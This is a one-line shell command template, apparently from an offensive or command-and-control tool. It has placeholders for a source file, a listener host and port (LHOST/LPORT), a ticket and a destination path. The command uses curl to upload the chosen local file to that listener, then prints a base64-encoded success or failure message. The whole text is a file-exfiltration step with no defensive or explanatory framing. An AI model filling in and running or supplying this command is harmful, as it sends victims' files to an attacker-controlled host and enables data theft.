src="*SRC*"; url="http://*LHOST*:*LPORT*/*TICKET*";dest="*DEST*"; ticket="*TICKET*"; ((curl -s -H "Destination-Path: $dest" -H "Ticket: $ticket" -F "file=@$src" $url) && echo U3VjY2VzcyEK | base64 -d) || echo Q29tbWFuZCBmYWlsZWQuCg== | base64 -d